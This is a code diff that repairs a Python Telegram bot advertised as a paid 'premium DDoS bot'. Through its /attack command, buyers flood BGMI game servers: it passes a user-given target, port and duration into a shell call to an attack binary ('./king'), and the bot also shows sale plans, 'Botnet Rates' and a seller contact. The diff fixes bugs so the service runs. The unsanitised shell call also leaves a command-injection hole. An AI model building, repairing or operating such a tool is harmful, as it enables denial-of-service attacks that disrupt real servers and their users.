@@ -18,6 +18,9 @@ USER_FILE = "users.txt"
 # File to store command logs
 LOG_FILE = "log.txt"
 
+# صححت: ضفت هذني لان كانن يطلعن خطأ مو معرفات
+FREE_USER_FILE = "free_users.txt"
+free_user_credits = {}
 
 # Function to read user IDs from the file
 def read_users():
@@ -33,7 +36,7 @@ def read_free_users():
         with open(FREE_USER_FILE, "r") as file:
             lines = file.read().splitlines()
             for line in lines:
-                if line.strip():  # Check if line is not empty
+                if line.strip(): # Check if line is not empty
                     user_info = line.split()
                     if len(user_info) == 2:
                         user_id, credits = user_info
@@ -43,22 +46,19 @@ def read_free_users():
     except FileNotFoundError:
         pass
 
-
 # List to store allowed user IDs
 allowed_user_ids = read_users()
 
 # Function to log command to the file
 def log_command(user_id, target, port, time):
-    admin_id = ["5984965552"]
     user_info = bot.get_chat(user_id)
     if user_info.username:
         username = "@" + user_info.username
     else:
         username = f"UserID: {user_id}"
-    
-    with open(LOG_FILE, "a") as file:  # Open in "append" mode
-        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
+    with open(LOG_FILE, "a") as file: # Open in "append" mode
+        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")
 
 # Function to clear logs
 def clear_logs():
@@ -82,11 +82,9 @@ def record_command_logs(user_id, command, target=None, port=None, time=None):
         log_entry += f" | Port: {port}"
     if time:
         log_entry += f" | Time: {time}"
-    
+
     with open(LOG_FILE, "a") as file:
         file.write(log_entry + "\n")
-
-import datetime
 
 # Dictionary to store the approval expiry date for each user
 user_approval_expiry = {}
@@ -113,10 +111,10 @@ def set_approval_expiry_date(user_id, duration, time_unit):
     elif time_unit == "week" or time_unit == "weeks":
         expiry_date = current_time + datetime.timedelta(weeks=duration)
     elif time_unit == "month" or time_unit == "months":
-        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
+        expiry_date = current_time + datetime.timedelta(days=30 * duration) # Approximation of a month
     else:
         return False
-    
+
     user_approval_expiry[user_id] = expiry_date
     return True
 
@@ -131,10 +129,10 @@ def add_user(message):
             duration_str = command[2]
 
             try:
-                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
+                duration = int(duration_str[:-4]) # Extract the numeric part of the duration
                 if duration <= 0:
                     raise ValueError
-                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
+                time_unit = duration_str[-4:].lower() # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                 if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                     raise ValueError
             except ValueError:
@@ -155,7 +153,7 @@ def add_user(message):
         else:
             response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @kingthenos_bhai."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @kingthenos_bhai."
 
     bot.reply_to(message, response)
 
@@ -169,9 +167,6 @@ def get_user_info(message):
     remaining_time = get_remaining_approval_time(user_id)
     response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
     bot.reply_to(message, response, parse_mode="HTML")
-
-
-
 
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
@@ -189,13 +184,12 @@ def remove_user(message):
             else:
                 response = f"User {user_to_remove} not found in the list ❌."
         else:
-            response = '''Please Specify A User ID to Remove. 
+            response = '''Please Specify A User ID to Remove.
 ✅ Usage: /remove <userid>😘'''
     else:
         response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @kingthenos_bhai."
 
     bot.reply_to(message, response)
-
 
 @bot.message_handler(commands=['clearlogs'])
 def clear_logs_command(message):
@@ -212,10 +206,8 @@ def clear_logs_command(message):
         except FileNotFoundError:
             response = "Logs are already cleared ❌."
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @kingthenos_bhai."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @kingthenos_bhai."
     bot.reply_to(message, response)
-
-
 
 @bot.message_handler(commands=['clearusers'])
 def clear_users_command(message):
@@ -234,7 +226,6 @@ def clear_users_command(message):
     else:
         response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @kingthenos_bhai."
     bot.reply_to(message, response)
- 
 
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
@@ -260,7 +251,6 @@ def show_all_users(message):
         response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @kingthenos_bhai."
     bot.reply_to(message, response)
 
-
 @bot.message_handler(commands=['logs'])
 def show_recent_logs(message):
     user_id = str(message.chat.id)
@@ -276,16 +266,14 @@ def show_recent_logs(message):
             response = "No data found ❌"
             bot.reply_to(message, response)
     else:
-        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @kingthenos_bhai."
+        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @kingthenos_bhai."
         bot.reply_to(message, response)
-
-
 
 # Function to handle the reply when free users run the /attack command
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
-    
+
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🚀🚀\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: VIP- @kingthenos_bhai KA KALA JADU"
     bot.reply_to(message, response)
 
@@ -308,29 +296,27 @@ def handle_attack(message):
                 return
             # Update the last time the user ran the command
             bgmi_cooldown[user_id] = datetime.datetime.now()
-        
+
         command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
+        if len(command) == 4: # Updated to accept target, time, and port
             target = command[1]
-            port = int(command[2])  # Convert time to integer
-            time = int(command[3])  # Convert port to integer
+            port = int(command[2]) # Convert time to integer
+            time = int(command[3]) # Convert port to integer
             if time > 1000:
                 response = "Error: Time interval must be less than 1000."
             else:
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
+                start_attack_reply(message, target, port, time) # Call start_attack_reply function
                 full_command = f"./king {target} {port} {time} 100"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
-            response = "✅ Usage :- /attack <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /attack <target> <port> <time>" # Updated command syntax
     else:
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command.                                                                          DM TO BUY ACCESS:- @kingthenos_bhai")
+        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. DM TO BUY ACCESS:- @kingthenos_bhai")
 
     bot.reply_to(message, response)
-
-
 
 # Add /mylogs command to display logs recorded for bgmi and website commands
 @bot.message_handler(commands=['mylogs'])
@@ -352,12 +338,11 @@ def show_command_logs(message):
 
     bot.reply_to(message, response)
 
-
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /attack : Method For Bgmi Servers. 
-💥 /rules : Please Check Before Use !!.
+💥 /attack : Method For Bgmi Servers.
+💥 /rules : Please Check Before Use!!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
 💥 /myinfo : TO Check Your WHOLE INFO.
@@ -368,21 +353,13 @@ def show_help(message):
 Buy From :- @kingthenos_bhai
 Official Channel :- https://t.me/+Bz7yCgbYk7RkNzQ9
 '''
-    for handler in bot.message_handlers:
-        if hasattr(handler, 'commands'):
-            if message.text.startswith('/help'):
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
-            elif handler.doc and 'admin' in handler.doc.lower():
-                continue
-            else:
-                help_text += f"{handler.commands[0]}: {handler.doc}\n"
     bot.reply_to(message, help_text)
 
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴄᴇss.
-🤖Try To Run This Command : /help 
+    response = f'''❄️ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴅᴅᴏs ʙᴏᴛ, {user_name}! ᴛʜɪs ɪs ʜɪɢʜ ǫᴜᴀʟɪᴛʏ sᴇʀᴠᴇʀ ʙᴀsᴇᴅ ᴅᴅᴏs. ᴛᴏ ɢᴇᴛ ᴀᴄᴇss.
+🤖Try To Run This Command : /help
 ✅BUY :- @kingthenos_bhai'''
     bot.reply_to(message, response)
 
@@ -391,7 +368,7 @@ def welcome_rules(message):
     user_name = message.from_user.first_name
     response = f'''{user_name} Please Follow These Rules ⚠️:
 
-1. Dont Run Too Many Attacks !! Cause A Ban From Bot
+1. Dont Run Too Many Attacks!! Cause A Ban From Bot
 2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot.
 3. MAKE SURE YOU JOINED https://t.me/+Bz7yCgbYk7RkNzQ9 OTHERWISE NOT WORK
 4. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
@@ -400,7 +377,7 @@ def welcome_rules(message):
 @bot.message_handler(commands=['plan'])
 def welcome_plan(message):
     user_name = message.from_user.first_name
-    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos !!:
+    response = f'''{user_name}, Brother Only 1 Plan Is Powerfull Then Any Other Ddos!!:
 
 Vip 🌟 :
 -> Attack Time : 300 (S)
@@ -429,7 +406,6 @@ def welcome_plan(message):
 '''
     bot.reply_to(message, response)
 
-
 @bot.message_handler(commands=['broadcast'])
 def broadcast_message(message):
     user_id = str(message.chat.id)
@@ -439,13 +415,11 @@ def broadcast_message(message):
             message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
             with open(USER_FILE, "r") as file:
                 user_ids = file.read().splitlines()
-                for user_id in user_ids:
-                    try:
-                        bot.delete_webhook()
-bot.polling()
-                        bot.send_message(user_id, message_to_broadcast)
-                    except Exception as e:
-                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
+            for user_id in user_ids:
+                try:
+                    bot.send_message(user_id, message_to_broadcast)
+                except Exception as e:
+                    print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
             response = "Broadcast Message Sent Successfully To All Users 👍."
         else:
             response = "🤖 Please Provide A Message To Broadcast."
@@ -454,7 +428,5 @@ bot.polling()
 
     bot.reply_to(message, response)
 
-
-
-
-bot.polling()
+bot.delete_webhook()
+bot.infinity_polling()
